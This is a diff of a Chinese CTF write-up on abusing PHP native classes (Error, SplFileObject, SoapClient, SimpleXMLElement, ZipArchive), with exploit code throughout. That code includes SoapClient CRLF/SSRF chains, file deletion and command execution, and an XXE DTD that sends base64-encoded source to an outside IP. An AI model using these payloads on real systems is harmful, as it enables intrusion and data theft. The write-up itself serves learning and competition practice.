@@ -108,7 +108,7 @@ if (isset($_GET[&#39;great&#39;]))&#123;
 <p> 要是常见的php题目，可以数组绕过强类型。在这题目中，需要Error类。<br>主要是绕过这个</p>
 <pre><code class="php">if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)))
 </code></pre>
-<p> md5()和sha1()可以对一个类进行hash，并且会触发这个类的 __toString 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 __toString 方法。<br>我们先来测试一下:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665202986018-e4a18f5f-99ca-4689-96f4-aba268382f66.png" alt="image.png"><br>注意两个Error要在同一行哦，否则他们报错的输出有行数的不同！<br>payload:</p>
+<p> md5()和sha1()可以对一个类进行hash，并且会触发这个类的 __toString 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 __toString 方法。<br>我们先来测试一下:<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665202986018-e4a18f5f-99ca-4689-96f4-aba268382f66.png" alt="img"><br>注意两个Error要在同一行哦，否则他们报错的输出有行数的不同！<br>payload:</p>
 <pre><code class="php">&lt;?php
 class SYCLOVER &#123;
     public $syc;
@@ -124,10 +124,10 @@ $c-&gt;syc = new Error($str,1);$c-&gt;lover=new Error($str,2);
 echo urlencode(serialize($c));
 ?&gt;
 </code></pre>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665212087693-85115409-6be8-4971-9941-dda917bee1d0.png" alt="image.png"><br>这里其实有一个地方要注意:</p>
+<p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665212087693-85115409-6be8-4971-9941-dda917bee1d0.png" alt="img"><br>这里其实有一个地方要注意:</p>
 <pre><code class="php">$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%99%93%9E%98%D1%8F%97%8F&quot;).&quot;?&gt;&quot;;
 </code></pre>
-<p>为什么最前面要加上?&gt;呢<br>我们还记得Error类返回什么吗?<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665212238513-51947da1-c5af-4d50-bc72-e700f1a297b9.png" alt="image.png"><br>Error是无法直接返回我们所需要的paylaod的，它前面有Error:影响，我们可以用&gt;?去闭合它<br>最终我们的语句就变为:</p>
+<p>为什么最前面要加上?&gt;呢<br>我们还记得Error类返回什么吗?<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665212238513-51947da1-c5af-4d50-bc72-e700f1a297b9.png" alt="img"><br>Error是无法直接返回我们所需要的paylaod的，它前面有Error:影响，我们可以用&gt;?去闭合它<br>最终我们的语句就变为:</p>
 <pre><code class="php">eval(&quot;Error:?&gt;&lt;?=include &#39;flag.php&#39;?&gt;xxxxxxx&quot;)
 </code></pre>
 <p>这样实际上是不影响语句的执行</p>
@@ -145,13 +145,13 @@ foreach($a as $f)&#123;
 &#125; 
 ?&gt; 
 </code></pre>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665216764271-1ae96322-73a5-4f13-a57c-9107ab60b212.png" alt="image.png"><br> 查看该类，发现__toString()方法<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665217135566-8285ea34-f95a-4dba-a8c0-0f866120c9f4.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665217175171-fec85446-9c96-432a-99df-28d5635fa417.png" alt="image.png"><br> 会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 __toString() 方法，输出指定目录里面经过排序之后的第一个文件名 配合glob://协议使用模式匹配来寻找我们想要的文件路径 </p>
+<p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665216764271-1ae96322-73a5-4f13-a57c-9107ab60b212.png" alt="img"><br> 查看该类，发现__toString()方法<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665217135566-8285ea34-f95a-4dba-a8c0-0f866120c9f4.png" alt="img"><br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665217175171-fec85446-9c96-432a-99df-28d5635fa417.png" alt="img"><br> 会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的toString() 方法，输出指定目录里面经过排序之后的第一个文件名 配合glob://协议使用模式匹配来寻找我们想要的文件路径 </p>
 <h2 id="Filesystemlterator"><a href="#Filesystemlterator" class="headerlink" title="Filesystemlterator"></a>Filesystemlterator</h2><p>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。<br>该类的使用方法与DirectoryIterator 类也是基本相同的：(子类与父类的关系)</p>
 <pre><code class="php">&lt;?php
 $dir=new FilesystemIterator(&quot;/&quot;);
 echo $dir;
 </code></pre>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665218139607-9e586dc8-c57f-411b-a0d7-e17dc51fac18.png" alt="image.png"><br>遍历一下</p>
+<p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218139607-9e586dc8-c57f-411b-a0d7-e17dc51fac18.png" alt="img"><br>遍历一下</p>
 <pre><code class="php">&lt;?php
 $dir=new FilesystemIterator(&quot;/&quot;);
 echo $dir;
@@ -160,14 +160,14 @@ foreach($dir as $tmp)&#123;
     echo &quot;\n&quot;;
 &#125;
 </code></pre>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665218128602-a7225ff2-4bc6-4903-9fad-3fac2139d6f7.png" alt="image.png"></p>
-<h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h2><p> SplFileObject 类和 SplFileinfo为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665218238132-374592ac-faae-4784-b50a-798f1e5fc2fa.png" alt="image.png"></p>
+<p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218128602-a7225ff2-4bc6-4903-9fad-3fac2139d6f7.png" alt="img"></p>
+<h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h2><p> SplFileObject 类和 SplFileinfo为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218238132-374592ac-faae-4784-b50a-798f1e5fc2fa.png" alt="img"></p>
 <pre><code class="php">    &lt;?php
     $dir=new SplFileObject(&quot;flag.php&quot;);
     echo $dir;
     ?&gt;
 </code></pre>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665218317940-59dff161-d172-4b69-9e72-ce88967e8562.png" alt="image.png"><br> 对文件中的每一行内容进行遍历：  </p>
+<p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218317940-59dff161-d172-4b69-9e72-ce88967e8562.png" alt="img"><br> 对文件中的每一行内容进行遍历：  </p>
 <pre><code class="php">&lt;?php
 $dir = new SplFileObject(&quot;flag.php&quot;);
 foreach($dir as $tmp)&#123;
@@ -175,7 +175,7 @@ foreach($dir as $tmp)&#123;
 &#125;
 ?&gt;
 </code></pre>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665218391694-fb13c795-3987-47a3-8a36-165697809110.png" alt="image.png"><br>出题的时候如果看到形如:</p>
+<p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218391694-fb13c795-3987-47a3-8a36-165697809110.png" alt="img"><br>出题的时候如果看到形如:</p>
 <pre><code class="php">    echo new $this-&gt;key($this-&gt;value);
  
  
@@ -194,7 +194,7 @@ $c-&gt;b=&quot;flag.php&quot;;
 echo new $c-&gt;a($c-&gt;b);
 ?&gt;
 </code></pre>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665218812533-da081255-65fe-494e-b0e4-ae13eb6c2b7d.png" alt="image.png"></p>
+<p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218812533-da081255-65fe-494e-b0e4-ae13eb6c2b7d.png" alt="img"></p>
 <h1 id="突破open-basedir的限制"><a href="#突破open-basedir的限制" class="headerlink" title="突破open_basedir的限制"></a>突破open_basedir的限制</h1><p> ctfshow web74  </p>
 <pre><code class="php">&lt;?php
 error_reporting(0);
@@ -254,7 +254,7 @@ echo $b;
 $c = unserialize($b);
 $c-&gt;not_exists_function();
 </code></pre>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665298510417-609387c8-6763-4ca9-922c-69419dae6f1d.png" alt="image.png"></p>
+<p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665298510417-609387c8-6763-4ca9-922c-69419dae6f1d.png" alt="img"></p>
 <h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><p> 从上图可以看到，SOAPAction处可控，可以把\x0d\x0a注入到SOAPAction，POST请求的header就可以被控制  </p>
 <pre><code class="php">&lt;?php
 $a = new SoapClient(null,array(&#39;uri&#39;=&gt;&quot;bbb\r\n\r\nccc\r\n&quot;, &#39;location&#39;=&gt;&#39;http://127.0.0.1:5555/path&#39;));
@@ -263,7 +263,9 @@ echo $b;
 $c = unserialize($b);
 $c-&gt;not_exists_function();
 </code></pre>
-<p>第一个参数是用来指明是否是 wsdl 模式。<br>第二个参数为一个数组，如果在 wsdl 模式下，此参数可选；如果在非 wsdl 模式下，则必须设置 location 和 uri 选项，其中 location 是要将请求发送到的 SOAP 服务器的 URL，而 uri 是 SOAP 服务的目标命名空间。具体可以设置的参数可见官方文档<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665299010016-b134387a-88ae-4b19-9b14-e495c2acd225.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665299033504-8234fdf2-329e-4b4c-ac0b-3512136fc295.png" alt="image.png"><br>但Content-Type在SOAPAction的上面，就无法控制Content-Typ,也就不能控制POST的数据<br>在header里User-Agent在Content-Type前面</p>
+<p>第一个参数是用来指明是否是 wsdl 模式。<br>第二个参数为一个数组，如果在 wsdl 模式下，此参数可选；如果在非 wsdl 模式下，则必须设置 location 和 uri 选项，其中 location 是要将请求发送到的 SOAP 服务器的 URL，而 uri 是 SOAP 服务的目标命名空间。具体可以设置的参数可见官方文档<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299010016-b134387a-88ae-4b19-9b14-e495c2acd225.png" alt="img"></p>
+<p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299033504-8234fdf2-329e-4b4c-ac0b-3512136fc295.png" alt="img"></p>
+<p>但Content-Type在SOAPAction的上面，就无法控制Content-Typ,也就不能控制POST的数据<br>在header里User-Agent在Content-Type前面</p>
 <pre><code class="php">https://www.php.net/manual/zh/soapclient.soapclient.php :
 The user_agent option specifies string to use in User-Agent header.
 </code></pre>
@@ -284,8 +286,10 @@ $c = unserialize($aaa);
 $c-&gt;not_exists_function();
 ?&gt;
 </code></pre>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665299220045-7fa39f85-3c66-4929-a97b-cf08e1d6a3a0.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665299243252-81156156-b050-4637-bea8-54bd0d302863.png" alt="image.png"><br>如上，使用SoapClient<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>+CRLF<strong>可以生成任意POST请求</strong>。<br><strong>Deserialization + __call + SoapClient + CRLF = SSRF</strong></p>
-<h2 id="N1CTF-2018-easy-harder-php"><a href="#N1CTF-2018-easy-harder-php" class="headerlink" title="[N1CTF 2018]easy_harder_php"></a><a target="_blank" rel="noopener" href="http://www.baidu.com/link?url=oGo5steYSGhrbjjf_RBqktmzUnvWTpUIj4QV7riBUNNxIkL67bsln8HTZAfs1lSXeqgf39HGtT9BCjt2N1fTb6v4mJacdeZcQvE8whLwuvm&wd=&eqid=f4d6d11600082915000000056342763d">[N1CTF 2018]easy_harder_php</a></h2><p><a target="_blank" rel="noopener" href="https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php">https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php</a><br>(我这里想复现一下，感觉code那里有问题，无法进行注册和登录操作)<br>拿到admin密码之后，需要从127.0.0.1登陆，用到SSRF，通过注入a`, {serialize object});#引发反序列化漏洞<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665328994027-84c31d48-8cd3-4d0d-b1cd-b093727e4019.png" alt="ebd6f7f1404a349ee8e31f27773af628.png"><br>反序列化后的SoapClient对象去调用不存在的getcountry方法，调用__call，实现SSRF<br>控制PHPSESSID为自己的session，SSRF来进行admin登陆</p>
+<p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299220045-7fa39f85-3c66-4929-a97b-cf08e1d6a3a0.png" alt="img"></p>
+<p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299243252-81156156-b050-4637-bea8-54bd0d302863-166888019827967.png" alt="img"></p>
+<p>如上，使用SoapClient<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>+CRLF<strong>可以生成任意POST请求</strong>。<br><strong>Deserialization + __call + SoapClient + CRLF = SSRF</strong></p>
+<h2 id="N1CTF-2018-easy-harder-php"><a href="#N1CTF-2018-easy-harder-php" class="headerlink" title="[N1CTF 2018]easy_harder_php"></a><a target="_blank" rel="noopener" href="http://www.baidu.com/link?url=oGo5steYSGhrbjjf_RBqktmzUnvWTpUIj4QV7riBUNNxIkL67bsln8HTZAfs1lSXeqgf39HGtT9BCjt2N1fTb6v4mJacdeZcQvE8whLwuvm&wd=&eqid=f4d6d11600082915000000056342763d">[N1CTF 2018]easy_harder_php</a></h2><p><a target="_blank" rel="noopener" href="https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php">https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php</a><br>(我这里想复现一下，感觉code那里有问题，无法进行注册和登录操作)<br>拿到admin密码之后，需要从127.0.0.1登陆，用到SSRF，通过注入a`, {serialize object});#引发反序列化漏洞<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665328994027-84c31d48-8cd3-4d0d-b1cd-b093727e4019.png" alt="img"><br>反序列化后的SoapClient对象去调用不存在的getcountry方法，调用__call，实现SSRF<br>控制PHPSESSID为自己的session，SSRF来进行admin登陆</p>
 <pre><code class="php">&lt;?php
 $target = &#39;http://127.0.0.1/index.php?action=login&#39;;
 $post_string = &#39;username=admin&amp;password=nu1ladmin&amp;code=cf44f3147ab331af7d66943d888c86f9&#39;;
@@ -301,7 +305,7 @@ echo bin2hex($aaa);
 ?&gt;
 </code></pre>
 <p> 再使用上面的PHPSESSID访问，就是admin了  </p>
-<h2 id="SUCTF-2019-Upload-Labs-2"><a href="#SUCTF-2019-Upload-Labs-2" class="headerlink" title="[SUCTF 2019]Upload Labs 2"></a>[SUCTF 2019]Upload Labs 2</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665421499752-266b58e3-9414-4291-b9c6-c3b67e187013.png"><br>这里只允许本地访问，我们要进行ssrf<br>构造exp:</p>
+<h2 id="SUCTF-2019-Upload-Labs-2"><a href="#SUCTF-2019-Upload-Labs-2" class="headerlink" title="[SUCTF 2019]Upload Labs 2"></a>[SUCTF 2019]Upload Labs 2</h2><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665421499752-266b58e3-9414-4291-b9c6-c3b67e187013.png" alt="img"><br>这里只允许本地访问，我们要进行ssrf<br>构造exp:</p>
 <pre><code class="php">&lt;?php
 class File&#123;
     public $file_name;
@@ -599,10 +603,10 @@ var_dump($method-&gt;$rd());
 <pre><code class="php">$method = new ReflectionMethod(User,a);
 var_dump($method-&gt;getDocComment); //getDocComment获取文档注释
 </code></pre>
-<p>由于不知道是在哪个方法内，所以可以进行遍历<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665485044657-d5e28374-5468-4f38-a96b-d076e14ca3f9.png" alt="image.png"></p>
+<p>由于不知道是在哪个方法内，所以可以进行遍历<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665485044657-d5e28374-5468-4f38-a96b-d076e14ca3f9.png" alt="img"></p>
 <h1 id="使用-SimpleXMLElement-类进行-XXE"><a href="#使用-SimpleXMLElement-类进行-XXE" class="headerlink" title="使用 SimpleXMLElement 类进行 XXE"></a>使用 SimpleXMLElement 类进行 XXE</h1><p> SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。  </p>
-<h2 id="SimpleXMLElement-类"><a href="#SimpleXMLElement-类" class="headerlink" title="SimpleXMLElement 类"></a>SimpleXMLElement 类</h2><p> 官方文档中对于SimpleXMLElement 类的构造方法 SimpleXMLElement::__construct 的定义如下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665487834374-89b18cf7-62f3-4f6d-8772-86dcad3bdbbd.png" alt="t01f512315ecae4f8e3.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665487841658-6b4bb837-d7b0-40a2-8dd4-58841f416edb.png" alt="t017279b3b019174cb6.png"><br>可以看到通过设置第三个参数 data_is_url 为 true，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为2即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。<br>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p>
-<h2 id="SUCTF-2018-Homework"><a href="#SUCTF-2018-Homework" class="headerlink" title="[SUCTF 2018]Homework"></a>[SUCTF 2018]Homework</h2><p>随便注册一个账户发现如下源码<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665933717474-8039a055-da9e-450d-b80a-9cf05791eb7f.png" alt="image.png"></p>
+<h2 id="SimpleXMLElement-类"><a href="#SimpleXMLElement-类" class="headerlink" title="SimpleXMLElement 类"></a>SimpleXMLElement 类</h2><p> 官方文档中对于SimpleXMLElement 类的构造方法 SimpleXMLElement::__construct 的定义如下：<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665487834374-89b18cf7-62f3-4f6d-8772-86dcad3bdbbd.png" alt="img"><br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665487841658-6b4bb837-d7b0-40a2-8dd4-58841f416edb.png" alt="img"><br>可以看到通过设置第三个参数 data_is_url 为 true，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为2即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。<br>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p>
+<h2 id="SUCTF-2018-Homework"><a href="#SUCTF-2018-Homework" class="headerlink" title="[SUCTF 2018]Homework"></a>[SUCTF 2018]Homework</h2><p>随便注册一个账户发现如下源码<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665933717474-8039a055-da9e-450d-b80a-9cf05791eb7f.png" alt="img"></p>
 <pre><code class="php">&lt;?php 
 class calc&#123;
     function __construct__()&#123;
@@ -639,7 +643,7 @@ class calc&#123;
 &#125;
 ?&gt;        
 </code></pre>
-<p> <img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665933869850-f292420e-807a-4315-9ae4-97d12651944b.png" alt="image.png"><br>我们可以利用SimpleXMLElement类<br>我们构造的xml如下:<br>test.xml</p>
+<p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665933869850-f292420e-807a-4315-9ae4-97d12651944b.png" alt="img"><br>我们可以利用SimpleXMLElement类<br>我们构造的xml如下:<br>test.xml</p>
 <pre><code class="php">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
 &lt;!DOCTYPE try[
 &lt;!ENTITY % int SYSTEM &quot;http://108.166.201.16:8000/evil.dtd&quot;&gt;
@@ -652,10 +656,10 @@ class calc&#123;
 <pre><code class="php">&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;
 &lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://108.166.201.16:5555/?%payl;&#39;&gt;&quot;&gt;
 </code></pre>
-<p>在vps上放上这两个文件<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665934117600-563713ba-7b9f-40ba-9e24-4b49b463c64a.png" alt="image.png"><br>然后再使用vps监听5555端口<br>最终构造payload</p>
+<p>在vps上放上这两个文件<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665934117600-563713ba-7b9f-40ba-9e24-4b49b463c64a.png" alt="img"><br>然后再使用vps监听5555端口<br>最终构造payload</p>
 <pre><code class="php">http://16c35a6e-0285-4dc1-9c3d-2acf598489fc.node4.buuoj.cn:81/show.php?module=SimpleXMLElement&amp;args[]=http://108.166.201.16:8000/test.xml&amp;args[]=2&amp;args[]=true
 </code></pre>
-<p>我们可以看到接受到了数据，base64解码即可<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665934164637-826456e2-a39d-499b-96c6-528cbaa8a0f9.png" alt="image.png"><br>同理可获得其他页面源码</p>
+<p>我们可以看到接受到了数据，base64解码即可<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665934164637-826456e2-a39d-499b-96c6-528cbaa8a0f9.png" alt="img"><br>同理可获得其他页面源码</p>
 <h1 id="使用-ZipArchive-类来删除文件"><a href="#使用-ZipArchive-类来删除文件" class="headerlink" title="使用 ZipArchive 类来删除文件"></a>使用 ZipArchive 类来删除文件</h1><h2 id="ZipArchive-类"><a href="#ZipArchive-类" class="headerlink" title="ZipArchive 类"></a>ZipArchive 类</h2><p>PHP ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理。<br>下面列举几个常见的类方法：</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ziparchive.addemptydir.php">ZipArchive::addEmptyDir</a>：添加一个新的文件目录</li>
@@ -759,7 +763,7 @@ if($_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;]&amp;&amp;(md5($_GET[&#39;a&#39;]) ===
     @unserialize(base64_decode($_POST[&#39;unser&#39;]));
 &#125;
 </code></pre>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1666010658741-eba5b190-5be1-4994-982d-2c2109ed09eb.png" alt="image.png"><br>这里反序列化前有个校验，直接使用数组绕过</p>
+<p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666010658741-eba5b190-5be1-4994-982d-2c2109ed09eb.png" alt="img"><br>这里反序列化前有个校验，直接使用数组绕过</p>
 <pre><code class="php">http://127.0.0.1/test/?a[]=1&amp;b[]=2
 </code></pre>
 <p>读取下shell.php的内容<br>构造payload:</p>
@@ -818,7 +822,7 @@ function shell($cmd)&#123;
     &#125;
 &#125;
 </code></pre>
-<p>shell.php可以执行系统命令<br>但是如果要执行shell.php<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1666010871391-7c2b5910-4f40-4616-8ff1-6e6309df9a70.png" alt="image.png"><br>必须不存在这个文件，那么我们就要想办法把它删除<br>我们必须要使用原生类，这个原生类还必须是open方法可以删除文件<br>遍历一下:</p>
+<p>shell.php可以执行系统命令<br>但是如果要执行shell.php<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666010871391-7c2b5910-4f40-4616-8ff1-6e6309df9a70.png" alt="img"><br>必须不存在这个文件，那么我们就要想办法把它删除<br>我们必须要使用原生类，这个原生类还必须是open方法可以删除文件<br>遍历一下:</p>
 <pre><code class="php">&lt;?php
 $classes = get_declared_classes();
 foreach ($classes as $class) &#123;
@@ -832,7 +836,7 @@ foreach ($classes as $class) &#123;
     &#125;
 &#125;
 </code></pre>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1666011335328-c952daa5-ae18-4e62-9460-028443cb42c0.png" alt="image.png"><br>ZipArchive刚好有个open方法可以满足,上文已经介绍过了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1666011423047-bc1ad514-77ec-4e4b-b46b-633575e9e46f.png" alt="image.png"><br>传入8相当于重写文件<br>最终构造poc:</p>
+<p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666011335328-c952daa5-ae18-4e62-9460-028443cb42c0.png" alt="img"><br>ZipArchive刚好有个open方法可以满足,上文已经介绍过了<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666011423047-bc1ad514-77ec-4e4b-b46b-633575e9e46f.png" alt="img"><br>传入8相当于重写文件<br>最终构造poc:</p>
 <pre><code class="php">&lt;?php
 class Open&#123;
 &#125;
@@ -876,7 +880,7 @@ echo base64_encode(serialize($a));
 </code></pre>
 <pre><code class="php">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo4O30=
 </code></pre>
-<p>传入后waf.txt就被删除，我这里是本地搭建的环境所以直接可以看到<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1666012203141-9ea79c5d-767c-451e-8f16-60826fb1108f.png" alt="image.png"><br>接下来构造poc执行命令即可:</p>
+<p>传入后waf.txt就被删除，我这里是本地搭建的环境所以直接可以看到<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666012203141-9ea79c5d-767c-451e-8f16-60826fb1108f.png" alt="img"><br>接下来构造poc执行命令即可:</p>
 <pre><code class="php">&lt;?php
 class Open&#123;
 &#125;
@@ -918,7 +922,7 @@ $a-&gt;filename = &#39;111&#39;;
 $a-&gt;file = new Open();
 echo base64_encode(serialize($a));
 </code></pre>
-<p>我这里是用windows系统复现的，所以使用命令不同，思路都一样<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1666012717080-da919474-bae9-47a8-978b-cd5b2e4b94a1.png" alt="image.png"></p>
+<p>我这里是用windows系统复现的，所以使用命令不同，思路都一样<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666012717080-da919474-bae9-47a8-978b-cd5b2e4b94a1.png" alt="img"></p>
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rawrecruit/article/details/123968687">https://blog.csdn.net/rawrecruit/article/details/123968687</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/331981.html">https://www.freebuf.com/articles/network/331981.html</a><br><a target="_blank" rel="noopener" href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p>
